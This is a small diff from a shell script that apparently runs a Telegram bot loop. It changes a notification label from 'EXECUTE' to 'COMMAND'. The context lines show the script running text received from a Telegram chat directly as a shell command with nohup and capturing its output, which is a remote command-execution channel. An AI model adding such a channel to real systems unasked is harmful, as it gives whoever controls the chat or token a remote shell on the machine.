@@ -143,7 +143,7 @@ while true ; do
 						echo "SKIP";
 					else
 						if [ "${#_tele_text}" -gt 0 ] ; then
-							curl -s -d "text=EXECUTE:[${_tele_text}]&chat_id=${_tele_chat_id}" "https://api.telegram.org/bot${_TELE_TOKEN}/sendMessage" > /dev/null
+							curl -s -d "text=COMMAND:[${_tele_text}]&chat_id=${_tele_chat_id}" "https://api.telegram.org/bot${_TELE_TOKEN}/sendMessage" > /dev/null
 							nohup "$_tele_text" > "${_TMP_DIR}/${_my_id}.cmd"
 
 							_ret_str=$(cat "${_TMP_DIR}/${_my_id}.cmd")
